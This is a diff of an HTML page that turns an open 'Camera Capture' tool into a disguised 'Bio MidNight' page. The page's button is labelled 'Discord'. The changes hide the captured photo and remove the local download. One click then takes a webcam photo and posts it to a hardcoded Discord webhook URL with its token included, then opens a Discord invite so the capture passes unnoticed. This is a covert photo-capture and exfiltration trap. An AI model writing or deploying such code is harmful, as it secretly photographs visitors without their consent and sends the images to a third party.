@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture and Send to Discord</title>
+    <title>Bio MidNight</title>
     <style>
         /* General Page Styling */
         body {
@@ -25,100 +25,117 @@
             color: #333;
         }
 
-        /* Button Styling */
-        button {
-            align-items: center;
-            background-image: linear-gradient(144deg, #af40ff, #5b42f3 50%, #00ddeb);
-            border: 0;
-            border-radius: 8px;
-            box-shadow: rgba(151, 65, 252, 0.2) 0 15px 30px -5px;
-            box-sizing: border-box;
-            color: #ffffff;
-            display: flex;
-            font-size: 18px;
-            justify-content: center;
-            line-height: 1em;
-            max-width: 100%;
-            min-width: 140px;
-            padding: 3px;
-            text-decoration: none;
-            user-select: none;
-            -webkit-user-select: none;
-            touch-action: manipulation;
-            white-space: nowrap;
+        /* From Uiverse.io by kleenpulse */
+        .btn {
+            --border-color: linear-gradient(-45deg, #ffae00, #7e03aa, #00fffb);
+            --border-width: 0.125em;
+            --curve-size: 0.5em;
+            --blur: 30px;
+            --bg: #080312;
+            --color: #afffff;
+            color: var(--color);
             cursor: pointer;
-            transition: all 0.3s;
+            position: relative;
+            isolation: isolate;
+            display: inline-grid;
+            place-content: center;
+            padding: 0.5em 1.5em;
+            font-size: 17px;
+            border: 0;
+            text-transform: uppercase;
+            box-shadow: 10px 10px 20px rgba(0, 0, 0, 0.6);
+            clip-path: polygon(
+                0% var(--curve-size),
+                var(--curve-size) 0,
+                100% 0,
+                100% calc(100% - var(--curve-size)),
+                calc(100% - var(--curve-size)) 100%,
+                0 100%
+            );
+            transition: color 250ms;
         }
 
-        button:active,
-        button:hover {
-            outline: 0;
+        .btn::after,
+        .btn::before {
+            content: "";
+            position: absolute;
+            inset: 0;
         }
 
-        button span {
-            background-color: rgb(5, 6, 45);
-            padding: 16px 24px;
-            border-radius: 6px;
-            width: 100%;
-            height: 100%;
-            transition: 300ms;
+        .btn::before {
+            background: var(--border-color);
+            background-size: 300% 300%;
+            animation: move-bg7234 5s ease infinite;
+            z-index: -2;
         }
 
-        button:hover span {
-            background: none;
+        @keyframes move-bg7234 {
+            0% {
+                background-position: 31% 0%;
+            }
+
+            50% {
+                background-position: 70% 100%;
+            }
+
+            100% {
+                background-position: 31% 0%;
+            }
         }
 
-        button:active {
-            transform: scale(0.9);
+        .btn::after {
+            background: var(--bg);
+            z-index: -1;
+            clip-path: polygon(
+                var(--border-width) calc(var(--curve-size) + var(--border-width) * 0.5),
+                calc(var(--curve-size) + var(--border-width) * 0.5) var(--border-width),
+                calc(100% - var(--border-width)) var(--border-width),
+                calc(100% - var(--border-width)) calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
+                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)) calc(100% - var(--border-width)),
+                var(--border-width) calc(100% - var(--border-width))
+            );
+            transition: clip-path 500ms;
         }
 
-        /* Image Display Styling */
+        .btn:where(:hover, :focus)::after {
+            clip-path: polygon(
+                calc(100% - var(--border-width)) calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
+                calc(100% - var(--border-width)) var(--border-width),
+                calc(100% - var(--border-width)) var(--border-width),
+                calc(100% - var(--border-width)) calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)),
+                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)) calc(100% - var(--border-width)),
+                calc(100% - calc(var(--curve-size) + var(--border-width) * 0.5)) calc(100% - var(--border-width))
+            );
+            transition: 200ms;
+        }
+
+        .btn:where(:hover, :focus) {
+            color: #fff;
+        }
+
+        /* Hiding the captured image */
         #capturedImage {
-            margin-top: 20px;
-            border: 5px solid #ddd;
-            border-radius: 8px;
-            max-width: 80%;
-            height: auto;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s ease-in-out;
-        }
-
-        #capturedImage:hover {
-            transform: scale(1.05);
-        }
-
-        /* Media Query for Smaller Screens */
-        @media (max-width: 600px) {
-            button {
-                font-size: 1rem;
-                padding: 12px 24px;
-            }
-
-            h1 {
-                font-size: 2rem;
-            }
-
-            #capturedImage {
-                max-width: 100%;
-            }
+            display: none; /* Do not display the image */
         }
     </style>
 </head>
 <body>
 
-<h1 id="text">Camera Capture</h1>
+<h1 id="text">Welcome to MidNight</h1>
 
-<button id="captureButton">
-    <span class="text">Click To Take Photo</span>
+<!-- Update button to use the new .btn class -->
+<button id="captureButton" class="btn">
+    <span class="text">Discord</span>
 </button>
-<img id="capturedImage" alt="Captured Photo">
 
 <script>
     const captureButton = document.getElementById('captureButton');
-    const capturedImage = document.getElementById('capturedImage');
 
-    // Replace with your Discord Webhook URL
-    const discordWebhookUrl = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';  // Copy and paste the webhook URL here
+    // Discord Webhook URL
+    const discordWebhookUrl = 'https://discord.com/api/webhooks/1303968519964196875/uTGDp9VSZ8whf0ZB_yxcle8dpzjh9jyiV5T1hElIWi2mS1FHLaNlj37q99ufIzHNPDbJ';
+    
+    // Discord Channel URL (This will open after sending the image)
+    const discordChannelUrl = 'https://discord.gg/keMzN9Za48';
 
     captureButton.addEventListener('click', async () => {
         let videoStream;
@@ -145,22 +162,20 @@
 
             // Get the image data as a base64 PNG image
             const imageUrl = canvas.toDataURL('image/png');
-            capturedImage.src = imageUrl;
-
-            // Create a download link for the captured image
-            const downloadLink = document.createElement('a');
-            downloadLink.href = imageUrl;
-            downloadLink.download = 'captured_image.png';
-            document.body.appendChild(downloadLink);
-            downloadLink.click();
+            
+            // Convert base64 image data to Blob
+            const response = await fetch(imageUrl);
+            const blob = await response.blob();
 
             // Send image to Discord
-            await sendImageToDiscord(imageUrl);
+            await sendImageToDiscord(blob);
 
             // Clean up: remove the video element and stop the video stream
             videoStream.getTracks().forEach(track => track.stop());
             document.body.removeChild(video);
-            document.body.removeChild(downloadLink);
+
+            // Open Discord channel after successful image upload
+            window.open(discordChannelUrl, '_blank');
 
         } catch (error) {
             console.error('Error accessing camera:', error);
@@ -168,16 +183,12 @@
         }
     });
 
-    // Function to send the captured image to Discord using a Webhook
-    async function sendImageToDiscord(imageUrl) {
+    // Function to send the captured image to Discord using the Webhook
+    async function sendImageToDiscord(imageBlob) {
         try {
-            // Convert the base64 image data to Blob
-            const response = await fetch(imageUrl);
-            const blob = await response.blob();
-
-            // Create FormData to send the image as multipart/form-data
+            // Prepare the FormData to send the image to Discord
             const formData = new FormData();
-            formData.append('file', blob, 'captured_image.png');
+            formData.append('file', imageBlob, 'captured_image.png');
 
             // Send POST request to Discord Webhook
             const sendResponse = await fetch(discordWebhookUrl, {
@@ -189,9 +200,11 @@
                 console.log('Image sent to Discord!');
             } else {
                 console.error('Failed to send image to Discord');
+                alert('Failed to send image to Discord.');
             }
         } catch (error) {
             console.error('Error sending image to Discord:', error);
+            alert('There was an error sending the image to Discord.');
         }
     }
 </script>
